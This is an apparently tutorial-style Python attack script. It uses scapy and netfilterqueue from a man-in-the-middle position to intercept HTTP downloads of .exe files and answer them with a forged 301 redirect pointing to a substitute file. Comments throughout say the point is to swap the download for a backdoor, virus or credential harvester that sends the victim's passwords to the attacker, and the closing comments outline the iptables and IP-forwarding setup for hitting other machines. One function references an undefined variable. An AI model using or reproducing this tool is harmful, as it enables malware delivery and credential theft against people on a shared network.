#!/usr/bin/env python
#previously we spoof dns req changing field of dns layer now we change field of http layer similar to dns_spoof 
# writing file interceptor 
# here we will change the download file downloaded by target computer changing field of http layer (layer where data are present)
#in this way download file change to backdoor or credential harvestor or virus 
# downloading file changer
import scapy.all as scapy
import netfilterqueue


ack_list=[]#to know response is for that req compare there ack which is same.
def set_load(packet,load):
    # replace the raw load of response by 301 status code example in wekipedia.look weakepedia 301 copy and use from its eg.
    scapy_packet[scapy.Raw].load=load
    # replace http://www.example.org/index.asp i location by other exe file from your or other server .here used exe of localhost link
    # now remove length and checksum in ip and tcp and scapy recalculates
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].len
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())#1convert to scapy packet
    if scapy_packet.haslayer(scapy.Raw): 
        # scapy http library can be used for printing and analyzing but for modifying it makes code much complex
        # so use scapy but scapy packet contain ip,tcp,udp and raw(http layer)
        # print(scapy_packet.show())#use ip table ip op for testing in your sys google something as html css js also part of http layer
        # confusion which is req and which is res layer look sport is http then res if dport is http then req(look at raw of them for data)
        if scapy_packet[scapy.TCP].dport==80:#80 implies http port
            print("[+] HTTP request")
            if ".exe" in scapy_packet[scapy.Raw].load:#if you wanna replace other file eg pdf,image use file extension
                # replacing host and url in load fild dont solve problem as tcp goes through 3 way handshake so, you have to manually initiate the tcp handshake. so
                # so replace data of response rather than request
                # modify response as handshake already been established. so need modifing for creating handshake.
                # the hex form is the data which is changed hex form before send.
                print("[+] exe request")
                # print(scapy_packet.show())
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport==80:#80 implies http port
            print("[+] HTTP response")
            # print(scapy_packet.show())   
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing fille")
                modified_packet=set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation:http://www.example.org/index.asp\n\n")
                
                packet.set_payload(str(modified_packet))#finally change payload of packet which need to be send
                # now run program clearing browsing history of browser
                # print(scapy_packet.show())
 
    packet.accept() 
queue=netfilterqueue.NetfilterQueue()#cerate object to interact with queue number 0 as specified as command in unix sys
queue.bind(0,process_packet) 
queue.run()

# test in your own device
# only use ip table ip op and download exe file from any url

# rest to other device 
# run forward chan ip table ,become mimf ,ip forward for mimf using echo 1 >..,and from other computer clear browsing history
# and download exe file from any url 
# can replace exe with exe file of your device ie replace with your credential harvestor(exe which send password stored on that computer to hacker computer as sms or email)

 
 
